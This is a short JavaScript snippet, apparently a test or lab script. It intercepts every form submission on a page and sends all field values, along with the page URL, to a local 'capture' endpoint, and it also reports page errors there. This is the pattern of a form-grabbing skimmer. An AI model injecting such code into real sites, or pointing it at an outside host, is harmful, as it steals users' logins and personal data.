(function() {
    function sendEvent(data) {
        fetch("http://127.0.0.1:3000/capture", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    }

    document.addEventListener("submit", e => {
        const form = e.target;
        const payload = {};

        new FormData(form).forEach((v, k) => payload[k] = v);

        sendEvent({
            type: "form_submit",
            url: window.location.href,
            payload,
            timestamp: Date.now()
        });
    });

    window.addEventListener("error", e => {
        sendEvent({
            type: "js_error",
            message: e.message,
            url: window.location.href,
            timestamp: Date.now()
        });
    });
})();
